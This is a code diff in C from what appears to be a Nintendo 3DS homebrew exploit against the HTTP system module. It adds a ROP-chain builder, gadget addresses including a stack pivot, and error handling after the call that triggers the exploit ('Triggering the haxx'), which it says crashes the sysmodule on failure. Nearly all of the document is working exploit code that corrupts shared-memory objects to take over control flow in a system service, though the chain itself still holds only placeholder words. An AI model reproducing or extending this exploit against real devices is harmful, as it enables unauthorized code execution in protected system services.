@@ -85,6 +85,16 @@ Result locate_sharedmem_linearaddr(u32 **linearaddr)
 	return 0;
 }
 
+void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
+{
+	u32 *ptr = *ropchain;
+
+	*ptr = value;
+
+	(*ropchain)++;
+	(*http_ropvaddr)+=4;
+}
+
 void init_hax_sharedmem(u32 *tmpbuf)
 {
 	u32 sharedmembase = 0x10006000;
@@ -93,10 +103,14 @@ void init_hax_sharedmem(u32 *tmpbuf)
 	u32 *initialhaxobj = &tmpbuf[0x200>>2];
 	u32 *haxobj1 = &tmpbuf[0x400>>2];
 	u32 *ropchain = &tmpbuf[0x600>>2];
+	u32 http_ropvaddr = sharedmembase+0x600;
 
 	u32 ROP_LDRR4R5_R5x1b8_OBJVTABLECALLx8 = 0x0010264c;//Load r4 from r5+0x1b8 and r6 from r5+0x1bc. Set r0 to r4. Load the vtable addr + funcptr using just r1 and blx to r1(vtable funcptr +8).
 	u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114b30;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
 	u32 ROP_STACKPIVOT = 0x00107b08;//Add sp with r3 then pop-pc.
+	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.
+
+	u32 ROP_POPR4R5R6PC = 0x00100248;//"pop {r4, r5, r6, pc}"
 
 	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
 
@@ -127,8 +141,8 @@ void init_hax_sharedmem(u32 *tmpbuf)
 	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x600.
 
 	//Setup the actual ROP-chain.
-	ropchain[0x0] = 0x58584148;
-	ropchain[0x4>>2] = 0x40404040;
+	ropgen_addword(&ropchain, &http_ropvaddr, 0x58584148);
+	ropgen_addword(&ropchain, &http_ropvaddr, 0x40404040);
 }
 
 Result writehax_sharedmem_physmem(u32 *linearaddr)
@@ -202,7 +216,12 @@ Result http_haxx(char *requrl)
 	}
 
 	printf("Triggering the haxx...\n");
-	httpcCloseContext(&context);
+	ret = httpcCloseContext(&context);
+	if(R_FAILED(ret))
+	{
+		printf("httpcCloseContext returned 0x%08x.\n", (unsigned int)ret);
+		if(ret==0xC920181A)printf("This error means the HTTP sysmodule crashed.\n");
+	}
 
 	return 0;
 }
